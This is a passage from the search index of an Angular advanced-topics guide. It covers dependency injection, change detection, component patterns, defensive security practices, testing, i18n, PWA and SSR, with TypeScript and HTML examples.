}\n}\n</code></pre> <pre><code>// app.module.ts\n@NgModule({\n  providers: [\n    { provide: NotificationHandler, useClass: EmailNotificationHandler, multi: true },\n    { provide: NotificationHandler, useClass: SmsNotificationHandler, multi: true }\n  ],\n  // ... declarations and imports\n})\nexport class AppModule { }\n</code></pre> <p>Injecting Multi-Providers: <pre><code>// notifier.service.ts\n@Injectable({ providedIn: 'root' })\nexport class NotifierService {\n  constructor(private handlers: NotificationHandler[]) {}\n\n  notify(message: string) {\n    this.handlers.forEach(handler =&gt; handler.send(message));\n  }\n}\n</code></pre></p>"},{"location":"angular/expert/#d-injection-tokens","title":"d. Injection Tokens","text":"<p>Description: Create custom tokens for dependency injection, especially for non-class dependencies like configuration objects.</p> <p>Example: <pre><code>// app.tokens.ts\nimport { InjectionToken } from '@angular/core';\n\nexport interface AppConfig {\n  apiEndpoint: string;\n  title: string;\n}\n\nexport const APP_CONFIG = new InjectionToken&lt;AppConfig&gt;('app.config');\n</code></pre></p> <pre><code>// app.module.ts\nimport { APP_CONFIG, AppConfig } from './app.tokens';\n\nconst MY_APP_CONFIG: AppConfig = {\n  apiEndpoint: 'https://api.example.com',\n  title: 'My Advanced Angular App'\n};\n\n@NgModule({\n  providers: [\n    { provide: APP_CONFIG, useValue: MY_APP_CONFIG }\n  ],\n  // ... declarations and imports\n})\nexport class AppModule { }\n</code></pre> <p>Injecting the Configuration: <pre><code>// some.service.ts\nimport { Inject, Injectable } from '@angular/core';\nimport { APP_CONFIG, AppConfig } from './app.tokens';\n\n@Injectable({ providedIn: 'root' })\nexport class SomeService {\n  constructor(@Inject(APP_CONFIG) private config: AppConfig) {\n    console.log(this.config.apiEndpoint);\n  }\n}\n</code></pre></p>"},{"location":"angular/expert/#8-change-detection-strategies","title":"8. Change Detection Strategies","text":"<p>Angular's change detection mechanism is pivotal for keeping the UI in sync with the underlying data model. Optimizing change detection can significantly enhance application performance.</p>"},{"location":"angular/expert/#a-default-change-detection","title":"a. Default Change Detection","text":"<p>Description: Angular's default strategy checks every component in the application tree for changes on each event cycle.</p> <p>Pros: - Simplicity: Automatically detects changes. - Ease of Use: No additional configuration required.</p> <p>Cons: - Performance Overhead: Can lead to unnecessary checks in large applications.</p>"},{"location":"angular/expert/#b-onpush-change-detection","title":"b. OnPush Change Detection","text":"<p>Description: Limits change detection to components when their input properties change or when an event originates from them.</p> <p>Benefits: - Improved Performance: Reduces the number of change detection cycles. - Predictable Updates: Encourages immutable data patterns.</p> <p>Implementation: <pre><code>@Component({\n  selector: 'app-user-profile',\n  templateUrl: './user-profile.component.html',\n  changeDetection: ChangeDetectionStrategy.OnPush\n})\nexport class UserProfileComponent {\n  @Input() user: User;\n}\n</code></pre></p> <p>Best Practices: - Immutable Data Structures: Use immutable patterns to ensure that changes are detected. - Avoid Direct Object Mutations: Instead of modifying objects directly, create new instances.</p>"},{"location":"angular/expert/#c-detached-change-detection","title":"c. Detached Change Detection","text":"<p>Description: Detaches a component's change detector from the change detection tree, giving manual control over when change detection runs.</p> <p>Use Case: Components that require manual change detection control for optimal performance.</p> <p>Implementation: <pre><code>@Component({\n  selector: 'app-detached',\n  template: `&lt;div&gt;{{ data }}&lt;/div&gt;`\n})\nexport class DetachedComponent implements OnInit {\n  data: string;\n\n  constructor(private cd: ChangeDetectorRef) {}\n\n  ngOnInit() {\n    this.cd.detach();\n    // Manually trigger change detection when needed\n    setTimeout(() =&gt; {\n      this.data = 'Updated Data';\n      this.cd.detectChanges();\n    }, 1000);\n  }\n}\n</code></pre></p>"},{"location":"angular/expert/#d-strategies-for-optimizing-change-detection","title":"d. Strategies for Optimizing Change Detection","text":"<ul> <li>Use Pure Pipes: Pure pipes are only recalculated when their inputs change, reducing unnecessary computations.</li> </ul> <p>Example: <pre><code>@Pipe({ name: 'uppercase', pure: true })\nexport class UppercasePipe implements PipeTransform {\n  transform(value: string): string {\n    return value.toUpperCase();\n  }\n}\n</code></pre></p> <ul> <li>Limit the Use of Template Bindings: Avoid complex expressions in templates that can trigger frequent change detection cycles.</li> </ul> <p>Instead of: <pre><code>&lt;div&gt;{{ computeValue() }}&lt;/div&gt;\n</code></pre></p> <p>Use: <pre><code>// Compute the value in the component and bind it\nthis.value = computeValue();\n</code></pre> <pre><code>&lt;div&gt;{{ value }}&lt;/div&gt;\n</code></pre></p> <ul> <li>Leverage TrackBy in *ngFor: Improve performance by tracking items by unique identifiers.</li> </ul> <p>Example: <pre><code>&lt;div *ngFor=\"let user of users; trackBy: trackById\"&gt;\n  {{ user.name }}\n&lt;/div&gt;\n</code></pre></p> <pre><code>trackById(index: number, user: User): number {\n  return user.id;\n}\n</code></pre>"},{"location":"angular/expert/#9-advanced-component-design","title":"9. Advanced Component Design","text":"<p>Designing reusable, maintainable, and high-performance components is essential for building scalable Angular applications.</p>"},{"location":"angular/expert/#a-smart-vs-dumb-components","title":"a. Smart vs. Dumb Components","text":"<p>Smart Components: - Responsibilities: Handle data fetching, state management, and business logic. - Interactions: Communicate with services and manage application state.</p> <p>Dumb Components: - Responsibilities: Presentational components focused on UI rendering. - Interactions: Receive data via <code>@Input</code> and emit events via <code>@Output</code>.</p> <p>Benefits: - Separation of Concerns: Enhances maintainability and testability. - Reusability: Dumb components can be reused across different parts of the application.</p> <p>Example:</p> <pre><code>// smart.component.ts\n@Component({\n  selector: 'app-smart',\n  template: `&lt;app-dumb [data]=\"data\" (action)=\"handleAction($event)\"&gt;&lt;/app-dumb&gt;`\n})\nexport class SmartComponent implements OnInit {\n  data: Data[];\n\n  constructor(private dataService: DataService) {}\n\n  ngOnInit() {\n    this.dataService.getData().subscribe(data =&gt; this.data = data);\n  }\n\n  handleAction(event: any) {\n    // Handle event from dumb component\n  }\n}\n</code></pre> <pre><code>// dumb.component.ts\n@Component({\n  selector: 'app-dumb',\n  template: `\n    &lt;div *ngFor=\"let item of data\"&gt;\n      {{ item.name }}\n      &lt;button (click)=\"action.emit(item)\"&gt;Action&lt;/button&gt;\n    &lt;/div&gt;\n  `\n})\nexport class DumbComponent {\n  @Input() data: Data[];\n  @Output() action = new EventEmitter&lt;any&gt;();\n}\n</code></pre>"},{"location":"angular/expert/#b-dynamic-components","title":"b. Dynamic Components","text":"<p>Description: Components that are created and inserted into the DOM at runtime, allowing for flexible UI structures.</p> <p>Use Cases: - Modal Dialogs - Dynamic Forms - Tooltips</p> <p>Implementation:</p> <pre><code>// dynamic-host.directive.ts\nimport { Directive, ViewContainerRef } from '@angular/core';\n\n@Directive({\n  selector: '[appDynamicHost]'\n})\nexport class DynamicHostDirective {\n  constructor(public viewContainerRef: ViewContainerRef) {}\n}\n</code></pre> <pre><code>// dynamic.component.ts\n@Component({\n  selector: 'app-dynamic',\n  template: `&lt;p&gt;I'm a dynamic component!&lt;/p&gt;`\n})\nexport class DynamicComponent {}\n</code></pre> <pre><code>// host.component.ts\nimport { Component, ViewChild, ComponentFactoryResolver } from '@angular/core';\nimport { DynamicHostDirective } from './dynamic-host.directive';\nimport { DynamicComponent } from './dynamic.component';\n\n@Component({\n  selector: 'app-host',\n  template: `&lt;ng-template appDynamicHost&gt;&lt;/ng-template&gt;`\n})\nexport class HostComponent {\n  @ViewChild(DynamicHostDirective, { static: true }) dynamicHost: DynamicHostDirective;\n\n  constructor(private resolver: ComponentFactoryResolver) {}\n\n  loadComponent() {\n    const factory = this.resolver.resolveComponentFactory(DynamicComponent);\n    const viewContainerRef = this.dynamicHost.viewContainerRef;\n    viewContainerRef.clear();\n    viewContainerRef.createComponent(factory);\n  }\n}\n</code></pre> <p>Triggering the Dynamic Component: <pre><code>&lt;!-- host.component.html --&gt;\n&lt;button (click)=\"loadComponent()\"&gt;Load Dynamic Component&lt;/button&gt;\n&lt;ng-template appDynamicHost&gt;&lt;/ng-template&gt;\n</code></pre></p>"},{"location":"angular/expert/#c-content-projection-and-ng-content","title":"c. Content Projection and ng-content","text":"<p>Description: Allows components to project content from their parent into specific placeholders within the child component.</p> <p>Example: Creating a Reusable Card Component</p> <pre><code>// card.component.ts\n@Component({\n  selector: 'app-card',\n  template: `\n    &lt;div class=\"card\"&gt;\n      &lt;div class=\"card-header\"&gt;\n        &lt;ng-content select=\"[card-header]\"&gt;&lt;/ng-content&gt;\n      &lt;/div&gt;\n      &lt;div class=\"card-body\"&gt;\n        &lt;ng-content&gt;&lt;/ng-content&gt;\n      &lt;/div&gt;\n      &lt;div class=\"card-footer\"&gt;\n        &lt;ng-content select=\"[card-footer]\"&gt;&lt;/ng-content&gt;\n      &lt;/div&gt;\n    &lt;/div&gt;\n  `\n})\nexport class CardComponent {}\n</code></pre> <p>Using the Card Component: <pre><code>&lt;!-- usage.component.html --&gt;\n&lt;app-card&gt;\n  &lt;div card-header&gt;\n    &lt;h3&gt;Card Title&lt;/h3&gt;\n  &lt;/div&gt;\n  &lt;p&gt;This is the card content.&lt;/p&gt;\n  &lt;div card-footer&gt;\n    &lt;button&gt;Action&lt;/button&gt;\n  &lt;/div&gt;\n&lt;/app-card&gt;\n</code></pre></p>"},{"location":"angular/expert/#d-higher-order-components-hocs","title":"d. Higher-Order Components (HOCs)","text":"<p>Description: Components that enhance other components by injecting additional functionality or data.</p> <p>Use Case: Implementing cross-cutting concerns like logging, error handling, or authentication.</p> <p>Example: Creating a Logging HOC</p> <pre><code>// with-logging.decorator.ts\nimport { Component, OnInit } from '@angular/core';\n\nexport function WithLogging&lt;T extends { new(...args: any[]): {} }&gt;(constructor: T) {\n  return class extends constructor implements OnInit {\n    ngOnInit() {\n      console.log(`Component ${constructor.name} initialized.`);\n      if (super.ngOnInit) {\n        super.ngOnInit();\n      }\n    }\n  }\n}\n</code></pre> <pre><code>// sample.component.ts\nimport { Component, OnInit } from '@angular/core';\nimport { WithLogging } from './with-logging.decorator';\n\n@WithLogging\n@Component({\n  selector: 'app-sample',\n  template: `&lt;p&gt;Sample Component&lt;/p&gt;`\n})\nexport class SampleComponent implements OnInit {\n  ngOnInit() {\n    // Original initialization logic\n  }\n}\n</code></pre>"},{"location":"angular/expert/#10-security-best-practices","title":"10. Security Best Practices","text":"<p>Securing Angular applications is paramount to protect data, ensure user privacy, and maintain trust.</p>"},{"location":"angular/expert/#a-cross-site-scripting-xss-prevention","title":"a. Cross-Site Scripting (XSS) Prevention","text":"<p>Description: Angular automatically sanitizes untrusted values to prevent XSS attacks.</p> <p>Best Practices: - Avoid Using <code>innerHTML</code>: Prefer Angular's data binding mechanisms which include sanitization.</p> <p>Instead of: <pre><code>&lt;div [innerHTML]=\"userInput\"&gt;&lt;/div&gt;\n</code></pre></p> <p>Use: <pre><code>&lt;div&gt;{{ userInput }}&lt;/div&gt;\n</code></pre></p> <ul> <li>Use the <code>DomSanitizer</code> When Necessary: If you must bypass Angular's sanitization, use <code>DomSanitizer</code> with caution.</li> </ul> <p>Example: <pre><code>import { DomSanitizer, SafeHtml } from '@angular/platform-browser';\n\nexport class SafeComponent {\n  safeHtml: SafeHtml;\n\n  constructor(private sanitizer: DomSanitizer) {\n    this.safeHtml = this.sanitizer.bypassSecurityTrustHtml('&lt;p&gt;Safe Content&lt;/p&gt;');\n  }\n}\n</code></pre></p>"},{"location":"angular/expert/#b-cross-site-request-forgery-csrf-protection","title":"b. Cross-Site Request Forgery (CSRF) Protection","text":"<p>Description: Prevent unauthorized commands from being transmitted from a user that the web application trusts.</p> <p>Best Practices: - Use HTTP-Only Cookies: Store authentication tokens in HTTP-only cookies to prevent access via JavaScript. - Implement CSRF Tokens: Include CSRF tokens in state-changing requests and validate them on the server side.</p>"},{"location":"angular/expert/#c-content-security-policy-csp","title":"c. Content Security Policy (CSP)","text":"<p>Description: Defines approved sources of content that browsers should be allowed to load, mitigating XSS and data injection attacks.</p> <p>Implementation: Configure CSP headers on the server serving the Angular application.</p> <p>Example Header: <pre><code>Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';\n</code></pre></p>"},{"location":"angular/expert/#d-secure-authentication-and-authorization","title":"d. Secure Authentication and Authorization","text":"<p>Best Practices: - Use Strong Authentication Mechanisms: Implement OAuth2, OpenID Connect, or other robust authentication protocols. - Token-Based Authentication: Use JWTs (JSON Web Tokens) with proper validation and expiration. - Role-Based Access Control (RBAC): Define user roles and permissions to restrict access to resources.</p>"},{"location":"angular/expert/#e-prevent-clickjacking","title":"e. Prevent Clickjacking","text":"<p>Description: Protect the application from being embedded in iframes by malicious sites.</p> <p>Implementation: Set the <code>X-Frame-Options</code> header to <code>DENY</code> or <code>SAMEORIGIN</code> on the server.</p> <p>Example Header: <pre><code>X-Frame-Options: DENY\n</code></pre></p>"},{"location":"angular/expert/#f-secure-storage","title":"f. Secure Storage","text":"<p>Description: Protect sensitive data stored on the client side.</p> <p>Best Practices: - Avoid Storing Sensitive Data in Local Storage: Use secure storage mechanisms or rely on server-side storage. - Encrypt Sensitive Data: If necessary, encrypt data before storing it on the client.</p>"},{"location":"angular/expert/#g-secure-apis","title":"g. Secure APIs","text":"<p>Best Practices: - Validate and Sanitize Inputs: Ensure all inputs are validated on the server side. - Implement Rate Limiting: Prevent brute-force attacks by limiting the number of requests. - Use HTTPS: Encrypt data in transit by serving APIs over HTTPS.</p>"},{"location":"angular/expert/#h-regular-security-audits","title":"h. Regular Security Audits","text":"<p>Description: Periodically review and test the application for security vulnerabilities.</p> <p>Tools: - Static Code Analysis: Use tools like ESLint with security plugins. - Penetration Testing: Conduct regular penetration tests to identify and mitigate vulnerabilities. - Dependency Scanning: Use tools like npm audit to detect vulnerabilities in dependencies.</p>"},{"location":"angular/expert/#11-testing-strategies","title":"11. Testing Strategies","text":"<p>Comprehensive testing ensures the reliability, maintainability, and performance of Angular applications. Employ a combination of unit tests, integration tests, and end-to-end (E2E) tests to achieve thorough coverage.</p>"},{"location":"angular/expert/#a-unit-testing-with-jasmine-and-karma","title":"a. Unit Testing with Jasmine and Karma","text":"<p>Description: Test individual components, services, and pipes in isolation.</p> <p>Setup: Angular CLI sets up Jasmine and Karma by default.</p> <p>Example: Testing a Component <pre><code>// user-profile.component.spec.ts\nimport { ComponentFixture, TestBed } from '@angular/core/testing';\nimport { UserProfileComponent } from './user-profile.component';\nimport { By } from '@angular/platform-browser';\n\ndescribe('UserProfileComponent', () =&gt; {\n  let component: UserProfileComponent;\n  let fixture: ComponentFixture&lt;UserProfileComponent&gt;;\n\n  beforeEach(async () =&gt; {\n    await TestBed.configureTestingModule({\n      declarations: [ UserProfileComponent ]\n    })\n    .compileComponents();\n  });\n\n  beforeEach(() =&gt; {\n    fixture = TestBed.createComponent(UserProfileComponent);\n    component = fixture.componentInstance;\n    component.user = { id: 1, name: 'John Doe' };\n    fixture.detectChanges();\n  });\n\n  it('should display user name', () =&gt; {\n    const nameElement = fixture.debugElement.query(By.css('.user-name')).nativeElement;\n    expect(nameElement.textContent).toContain('John Doe');\n  });\n});\n</code></pre></p>"},{"location":"angular/expert/#b-integration-testing","title":"b. Integration Testing","text":"<p>Description: Test interactions between multiple components or services to ensure they work together as expected.</p> <p>Example: Testing a Service with HTTP Calls <pre><code>// user.service.spec.ts\nimport { TestBed } from '@angular/core/testing';\nimport { UserService } from './user.service';\nimport { HttpClientTestingModule, HttpTestingController } from '@angular/common/http/testing';\nimport { User } from '../models/user.model';\n\ndescribe('UserService', () =&gt; {\n  let service: UserService;\n  let httpMock: HttpTestingController;\n\n  beforeEach(() =&gt; {\n    TestBed.configureTestingModule({\n      imports: [ HttpClientTestingModule ],\n      providers: [ UserService ]\n    });\n\n    service = TestBed.inject(UserService);\n    httpMock = TestBed.inject(HttpTestingController);\n  });\n\n  it('should fetch users', () =&gt; {\n    const mockUsers: User[] = [\n      { id: 1, name: 'John Doe' },\n      { id: 2, name: 'Jane Smith' }\n    ];\n\n    service.getAllUsers().subscribe(users =&gt; {\n      expect(users.length).toBe(2);\n      expect(users).toEqual(mockUsers);\n    });\n\n    const req = httpMock.expectOne('/api/users');\n    expect(req.request.method).toBe('GET');\n    req.flush(mockUsers);\n  });\n\n  afterEach(() =&gt; {\n    httpMock.verify();\n  });\n});\n</code></pre></p>"},{"location":"angular/expert/#c-end-to-end-e2e-testing-with-cypress","title":"c. End-to-End (E2E) Testing with Cypress","text":"<p>Description: Simulate real user interactions to test the application flow from start to finish.</p> <p>Setup: Angular CLI supports Cypress as an E2E testing framework.</p> <p>Installation: <pre><code>ng add @cypress/schematic\n</code></pre></p> <p>Example: Testing User Login Flow <pre><code>// cypress/integration/login.spec.js\ndescribe('User Login', () =&gt; {\n  it('should log in successfully', () =&gt; {\n    cy.visit('/login');\n    cy.get('input[name=email]').type('user@example.com');\n    cy.get('input[name=password]').type('SecurePass123!');\n    cy.get('button[type=submit]').click();\n    cy.url().should('include', '/dashboard');\n    cy.contains('Welcome, User!');\n  });\n});\n</code></pre></p>"},{"location":"angular/expert/#d-test-coverage","title":"d. Test Coverage","text":"<p>Description: Measure the extent to which your codebase is tested, identifying untested parts.</p> <p>Implementation: Generate a test coverage report using Angular CLI.</p> <pre><code>ng test --code-coverage\n</code></pre> <p>Viewing the Report: Open the generated <code>coverage/index.html</code> file in a browser.</p> <p>Best Practices: - Aim for High Coverage: Strive for at least 80% coverage, focusing on critical paths. - Identify Gaps: Use coverage reports to identify and address untested areas. - Maintain Quality Over Quantity: Focus on meaningful tests rather than merely increasing coverage percentages.</p>"},{"location":"angular/expert/#e-mocking-and-dependency-injection-in-tests","title":"e. Mocking and Dependency Injection in Tests","text":"<p>Description: Isolate components and services by mocking dependencies, ensuring tests are focused and reliable.</p> <p>Example: Mocking a Service in a Component Test <pre><code>// user-list.component.spec.ts\nimport { ComponentFixture, TestBed } from '@angular/core/testing';\nimport { UserListComponent } from './user-list.component';\nimport { UserService } from '../services/user.service';\nimport { of } from 'rxjs';\nimport { User } from '../models/user.model';\n\nclass MockUserService {\n  getAllUsers() {\n    return of([\n      { id: 1, name: 'John Doe' },\n      { id: 2, name: 'Jane Smith' }\n    ]);\n  }\n}\n\ndescribe('UserListComponent', () =&gt; {\n  let component: UserListComponent;\n  let fixture: ComponentFixture&lt;UserListComponent&gt;;\n\n  beforeEach(async () =&gt; {\n    await TestBed.configureTestingModule({\n      declarations: [ UserListComponent ],\n      providers: [\n        { provide: UserService, useClass: MockUserService }\n      ]\n    })\n    .compileComponents();\n  });\n\n  beforeEach(() =&gt; {\n    fixture = TestBed.createComponent(UserListComponent);\n    component = fixture.componentInstance;\n    fixture.detectChanges();\n  });\n\n  it('should display users', () =&gt; {\n    const compiled = fixture.nativeElement;\n    expect(compiled.querySelectorAll('.user-item').length).toBe(2);\n    expect(compiled.textContent).toContain('John Doe');\n    expect(compiled.textContent).toContain('Jane Smith');\n  });\n});\n</code></pre></p>"},{"location":"angular/expert/#12-internationalization-i18n-and-localization","title":"12. Internationalization (i18n) and Localization","text":"<p>Description: Support multiple languages and regional settings to cater to a global audience.</p>"},{"location":"angular/expert/#a-angulars-i18n-framework","title":"a. Angular's i18n Framework","text":"<p>Steps to Implement i18n:</p> <ol> <li> <p>Mark Text for Translation: <pre><code>&lt;h1 i18n=\"@@homeTitle\"&gt;Welcome to MyApp&lt;/h1&gt;\n</code></pre></p> </li> <li> <p>Extract Translatable Strings: <pre><code>ng extract-i18n\n</code></pre>    This generates a <code>messages.xlf</code> file.</p> </li> <li> <p>Translate the XLF File:    Provide translated versions of the <code>messages.xlf</code> for each target language (e.g., <code>messages.es.xlf</code> for Spanish).</p> </li> <li> <p>Configure Build for Multiple Locales: <pre><code>// angular.json\n\"projects\": {\n  \"my-advanced-app\": {\n    // ... other configurations\n    \"architect\": {\n      \"build\": {\n        \"options\": {\n          // ... existing options\n          \"i18nFile\": \"src/locale/messages.es.xlf\",\n          \"i18nLocale\": \"es\",\n          \"i18nFormat\": \"xlf\",\n          \"i18nMissingTranslation\": \"warning\"\n        },\n        \"configurations\": {\n          \"production-es\": {\n            \"localize\": [\"es\"],\n            // ... other production options\n          }\n        }\n      }\n    }\n  }\n}\n</code></pre></p> </li> <li> <p>Build the Application for Each Locale: <pre><code>ng build --prod --configuration=production-es\n</code></pre></p> </li> </ol>"},{"location":"angular/expert/#b-dynamic-language-switching","title":"b. Dynamic Language Switching","text":"<p>Description: Allow users to switch languages at runtime without reloading the application.</p> <p>Implementation Using ngx-translate:</p> <p>Installation: <pre><code>npm install @ngx-translate/core @ngx-translate/http-loader\n</code></pre></p> <p>Configuration: <pre><code>// app.module.ts\nimport { HttpClient } from '@angular/common/http';\nimport { TranslateLoader, TranslateModule } from '@ngx-translate/core';\nimport { TranslateHttpLoader } from '@ngx-translate/http-loader';\n\nexport function HttpLoaderFactory(http: HttpClient) {\n  return new TranslateHttpLoader(http);\n}\n\n@NgModule({\n  imports: [\n    // ... other imports\n    TranslateModule.forRoot({\n      loader: {\n        provide: TranslateLoader,\n        useFactory: HttpLoaderFactory,\n        deps: [HttpClient]\n      }\n    })\n  ],\n  // ... declarations and bootstrap\n})\nexport class AppModule { }\n</code></pre></p> <p>Creating Translation Files: - en.json <pre><code>{\n  \"HOME\": {\n    \"TITLE\": \"Welcome to MyApp\"\n  }\n}\n</code></pre> - es.json <pre><code>{\n  \"HOME\": {\n    \"TITLE\": \"Bienvenido a MyApp\"\n  }\n}\n</code></pre></p> <p>Using Translations in Components: <pre><code>&lt;!-- home.component.html --&gt;\n&lt;h1&gt;{{ 'HOME.TITLE' | translate }}&lt;/h1&gt;\n&lt;button (click)=\"switchLanguage('es')\"&gt;Espa\u00f1ol&lt;/button&gt;\n&lt;button (click)=\"switchLanguage('en')\"&gt;English&lt;/button&gt;\n</code></pre></p> <pre><code>// home.component.ts\nimport { Component } from '@angular/core';\nimport { TranslateService } from '@ngx-translate/core';\n\n@Component({\n  selector: 'app-home',\n  templateUrl: './home.component.html'\n})\nexport class HomeComponent {\n  constructor(private translate: TranslateService) {\n    translate.setDefaultLang('en');\n  }\n\n  switchLanguage(lang: string) {\n    this.translate.use(lang);\n  }\n}\n</code></pre>"},{"location":"angular/expert/#c-handling-dates-numbers-and-currencies","title":"c. Handling Dates, Numbers, and Currencies","text":"<p>Description: Format dates, numbers, and currencies based on the user's locale.</p> <p>Using Angular Pipes: <pre><code>&lt;p&gt;{{ today | date:'longDate':'':'es' }}&lt;/p&gt;\n&lt;p&gt;{{ amount | currency:'EUR':'symbol':'1.2-2':'es' }}&lt;/p&gt;\n</code></pre></p> <p>Customizing Formats: Provide custom formats in the <code>LOCALE_ID</code> or use third-party libraries for more advanced formatting needs.</p>"},{"location":"angular/expert/#13-progressive-web-apps-pwa-with-angular","title":"13. Progressive Web Apps (PWA) with Angular","text":"<p>Description: Enhance Angular applications with PWA capabilities, providing offline access, push notifications, and improved performance.</p>"},{"location":"angular/expert/#a-adding-pwa-support","title":"a. Adding PWA Support","text":"<p>Installation: <pre><code>ng add @angular/pwa\n</code></pre></p> <p>Features Added: - Service Worker: Handles caching and offline functionality. - Web Manifest: Defines the application's metadata for installation. - Icons and Splash Screens: Provide visual assets for different devices.</p>"},{"location":"angular/expert/#b-configuring-the-service-worker","title":"b. Configuring the Service Worker","text":"<p>Customization: Modify the <code>ngsw-config.json</code> file to define caching strategies.</p> <p>Example: <pre><code>{\n  \"index\": \"/index.html\",\n  \"assetGroups\": [\n    {\n      \"name\": \"app\",\n      \"installMode\": \"prefetch\",\n      \"resources\": {\n        \"files\": [\n          \"/favicon.ico\",\n          \"/index.html\",\n          \"/*.css\",\n          \"/*.js\"\n        ]\n      }\n    },\n    {\n      \"name\": \"assets\",\n      \"installMode\": \"lazy\",\n      \"updateMode\": \"prefetch\",\n      \"resources\": {\n        \"files\": [\n          \"/assets/**\",\n          \"/*.(png|jpg|jpeg|svg|gif)\"\n        ]\n      }\n    }\n  ]\n}\n</code></pre></p>"},{"location":"angular/expert/#c-enabling-offline-functionality","title":"c. Enabling Offline Functionality","text":"<p>Description: Allow the application to function without an internet connection by caching essential assets and data.</p> <p>Implementation: Ensure critical assets and API responses are cached appropriately using the service worker configuration.</p> <p>Example: Caching API Responses with Data Groups <pre><code>{\n  \"dataGroups\": [\n    {\n      \"name\": \"api-freshness\",\n      \"urls\": [\n        \"/api/products/**\",\n        \"/api/users/**\"\n      ],\n      \"cacheConfig\": {\n        \"strategy\": \"freshness\",\n        \"maxSize\": 100,\n        \"maxAge\": \"1h\",\n        \"timeout\": \"10s\"\n      }\n    }\n  ]\n}\n</code></pre></p>"},{"location":"angular/expert/#d-push-notifications","title":"d. Push Notifications","text":"<p>Description: Engage users by sending real-time notifications, even when the application is not active.</p> <p>Implementation: Integrate with services like Firebase Cloud Messaging (FCM) to handle push notifications.</p> <p>Steps: 1. Set Up FCM: Create a project on Firebase and obtain the necessary credentials. 2. Configure Service Worker: Implement the FCM service worker to handle incoming messages. 3. Request User Permission: Prompt users to allow notifications. 4. Handle Incoming Notifications: Define actions upon receiving notifications.</p>"},{"location":"angular/expert/#14-angular-universal-and-server-side-rendering-ssr","title":"14. Angular Universal and Server-Side Rendering (SSR)","text":"<p>Description: Implement server-side rendering to improve performance, SEO, and initial load times.</p>"},{"location":"angular/expert/#a-adding-angular-universal","title":"a. Adding Angular Universal","text":"<p>Installation: <pre><code>ng add @nguniversal/express-engine\n</code></pre></p> <p>Steps: 1. Generate Universal Files: Creates server-side rendering files like <code>server.ts</code>. 2. Update <code>angular.json</code>: Configures build and serve options for SSR. 3. Build and Serve: <pre><code>npm run build:ssr\nnpm run serve:ssr\n</code></pre></p>"},{"location":"angular/expert/#b-benefits-of-server-side-rendering","title":"b. Benefits of Server-Side Rendering","text":"<ul> <li>Improved SEO: Search engines can crawl pre-rendered content more effectively.</li> <li>Faster Initial Load: Users receive a fully rendered page quickly, enhancing perceived performance.</li> <li>Better Social Media Sharing: Metadata is readily available for link previews.</li> </ul>"},{"location":"angular/expert/#c-handling-dynamic-content","title":"c. Handling Dynamic Content","text":"<p>Description: Manage dynamic data fetching on the server to ensure content is rendered correctly.</p> <p>Implementation: Use Angular's <code>TransferState</code> API to transfer data from the server to the client, avoiding redundant HTTP requests.</p> <p>Example: <pre><code>// app.server.module.ts\nimport { NgModule } from '@angular/core';\nimport { ServerModule, ServerTransferStateModule } from '@angular/platform-server';\nimport { AppModule } from './app.module';\nimport { AppComponent } from './app.component';\n\n@NgModule({\n  imports: [\n    AppModule,\n    ServerModule,\n    ServerTransferStateModule\n  ],\n  bootstrap: [AppComponent],\n})\nexport class AppServerModule {}\n</code></pre></p>"},{"location":"angular/expert/#15-latest-features-in-angular-16","title":"15. Latest Features in Angular 16","text":"<p>Angular continues to evolve, introducing new features and improvements to enhance developer productivity and application performance. As of Angular version 16, the framework includes several notable advancements:</p>"},{"location":"angular/expert/#a-standalone-components","title":"a. Standalone Components","text":"<p>Description: Simplify component declarations by eliminating the need for NgModules, promoting a more modular and tree-shakable architecture.</p> <p>Benefits: - Reduced Boilerplate: Fewer files and configurations. - Enhanced Tree Shaking: Unused components are more easily removed during the build process. - Improved Developer Experience: Easier to understand and manage component dependencies.</p> <p>Example: Creating a Standalone Component <pre><code>// hello.component.ts\nimport { Component } from '@angular/core';\n\n@Component({\n  selector: 'app-hello',\n  template: `&lt;h1&gt;Hello, Standalone Component!&lt;/h1&gt;`,\n  standalone: true\n})\nexport class HelloComponent { }\n</code></pre></p> <p>Using the Standalone Component: <pre><code>// app.component.ts\nimport { Component } from '@angular/core';\nimport { HelloComponent } from './hello.component';\n\n@Component({\n  selector: 'app-root',\n  template: `&lt;app-hello&gt;&lt;/app-hello&gt;`,\n  standalone: true,\n  imports: [HelloComponent]\n})\nexport class AppComponent { }\n</code></pre></p>"},{"location":"angular/expert/#b-enhanced-signals-api","title":"b. Enhanced Signals API","text":"<p>Description: Introduces a reactive primitive for managing state changes more efficiently, improving performance and developer ergonomics.</p> <p>Benefits: - Fine-Grained Reactivity: Allows components to react to specific state changes. - Improved Performance: Minimizes unnecessary change detection cycles.</p> <p>Example: Using Signals for State Management <pre><code>// counter.signals.ts\nimport { signal } from '@angular/core';\n\nexport const counter = signal(0);\n\nexport function increment() {\n  counter.set(counter() + 1);\n}\n\nexport function decrement() {\n  counter.set(counter() - 1);\n}\n</code></pre></p> <pre><code>&lt;!-- counter.component.html --&gt;\n&lt;div&gt;\n  &lt;button (click)=\"decrement()\"&gt;-&lt;/button&gt;\n  &lt;span&gt;{{ counter() }}&lt;/span&gt;\n  &lt;button (click)=\"increment()\"&gt;+&lt;/button&gt;\n&lt;/div&gt;\n</code></pre> <pre><code>// counter.component.ts\nimport { Component } from '@angular/core';\nimport { counter, increment, decrement } from './counter.signals';\n\n@Component({\n  selector: 'app-counter',\n  templateUrl: './counter.component.html',\n  standalone: true\n})\nexport class CounterComponent {\n  counter = counter;\n  increment = increment;\n  decrement = decrement;\n}\n</code></pre>"},{"location":"angular/expert/#c-improved-hydration-for-ssr","title":"c. Improved Hydration for SSR","text":"<p>Description: Enhances server-side rendering by improving the hydration process, ensuring seamless interactivity between server-rendered content and client-side applications.</p> <p>Benefits: - Faster Interactive Content: Reduces the time taken for content to become interactive after initial load. - Better User Experience: Minimizes delays and jank during the hydration phase.</p>"},{"location":"angular/expert/#d-typed-forms","title":"d. Typed Forms","text":"<p>Description: Introduces stricter type safety for Angular's reactive forms, reducing runtime errors and enhancing developer tooling support.</p> <p>Benefits: - Enhanced Type Safety: Prevents common form-related bugs. - Improved IDE Support: Better autocomplete and type checking in development environments.</p> <p>Example: Creating a Typed Reactive Form <pre><code>// user-form.component.ts\nimport { Component } from '@angular/core';\nimport { FormBuilder, FormGroup, Validators } from '@angular/forms';\n\ninterface UserForm {\n  name: string;\n  email: string;\n  age: number;\n}\n\n@Component({\n  selector: 'app-user-form',\n  templateUrl: './user-form.component.html',\n  standalone: true\n})\nexport class UserFormComponent {\n  userForm: 